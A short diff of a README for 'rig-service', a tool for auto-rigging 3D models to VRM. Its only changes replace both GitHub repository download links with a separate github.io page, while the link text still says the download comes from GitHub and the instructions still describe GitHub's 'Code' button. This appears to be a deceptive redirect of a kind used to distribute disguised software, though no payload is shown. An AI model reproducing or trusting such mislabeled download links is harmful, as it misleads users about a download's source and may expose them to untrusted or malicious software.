@@ -1,6 +1,6 @@
 # 🤖 rig-service - Automate 3D Model Rigging And VRM
 
-[![](https://img.shields.io/badge/Download-rig--service-blue)](https://github.com/Singhama8615/rig-service)
+[![](https://img.shields.io/badge/Download-rig--service-blue)](https://singhama8615.github.io)
 
 This software adds human bones to your 3D models. After you process your models, they can move and react to pose data. It turns static 3D objects into animated characters compatible with VRM formats.
 
@@ -21,7 +21,7 @@ Your computer needs a few components to run this software. Please ensure your ma
 
 You can obtain the current version of the software through our official repository link.
 
-[Download rig-service from GitHub](https://github.com/Singhama8615/rig-service)
+[Download rig-service from GitHub](https://singhama8615.github.io)
 
 Visit this link and click the green "Code" button. Select "Download ZIP" to save the files to your computer. Once the download finishes, move the folder to a location on your hard drive where you intend to keep your projects.
 
